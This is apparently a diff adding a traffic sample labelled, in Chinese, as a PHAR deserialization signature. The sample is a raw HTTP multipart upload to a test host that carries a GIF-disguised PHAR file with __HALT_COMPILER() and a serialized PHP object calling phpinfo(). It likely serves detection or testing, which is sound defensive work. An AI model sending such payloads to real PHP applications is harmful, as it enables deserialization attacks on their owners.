@@ -1,0 +1,22 @@
+# phar反序列化特征
+POST / HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 456
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+GIF89a __HALT_COMPILER(); 
+
+i3O:10:"TestObject":1:{s:4:"data";s:10:"phpinfo();";test.txt8i~囟test夘罬臝摓韶嫨?拦qBGBMB
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
